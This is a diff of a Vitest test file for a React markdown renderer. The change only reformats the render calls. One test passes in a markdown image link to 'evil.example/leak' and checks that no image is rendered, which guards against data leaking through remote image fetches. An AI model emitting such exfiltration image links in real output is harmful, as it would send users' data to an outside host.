@@ -6,7 +6,11 @@ import { describe, expect, it } from 'vitest';
 import { MarkdownContent } from './MarkdownContent';
 
 function anchor(markdown: string): HTMLAnchorElement {
-  const { container } = render(<MemoryRouter><MarkdownContent content={markdown} /></MemoryRouter>);
+  const { container } = render(
+    <MemoryRouter>
+      <MarkdownContent content={markdown} />
+    </MemoryRouter>,
+  );
   const a = container.querySelector('a');
   if (!a) throw new Error(`no link rendered: ${container.innerHTML}`);
   return a;
@@ -31,13 +35,21 @@ describe('MarkdownContent', () => {
   });
 
   it('never renders an <img>, so a remote image is never fetched', () => {
-    const { container } = render(<MemoryRouter><MarkdownContent content="![chart](https://evil.example/leak?d=1)" /></MemoryRouter>);
+    const { container } = render(
+      <MemoryRouter>
+        <MarkdownContent content="![chart](https://evil.example/leak?d=1)" />
+      </MemoryRouter>,
+    );
     expect(container.querySelector('img')).toBeNull();
     expect(container.textContent).toContain('[chart]');
   });
 
   it('renders GitHub-flavoured tables', () => {
-    const { container } = render(<MemoryRouter><MarkdownContent content={'| a | b |\n|---|---|\n| 1 | 2 |'} /></MemoryRouter>);
+    const { container } = render(
+      <MemoryRouter>
+        <MarkdownContent content={'| a | b |\n|---|---|\n| 1 | 2 |'} />
+      </MemoryRouter>,
+    );
     expect(container.querySelectorAll('td')).toHaveLength(2);
   });
 });
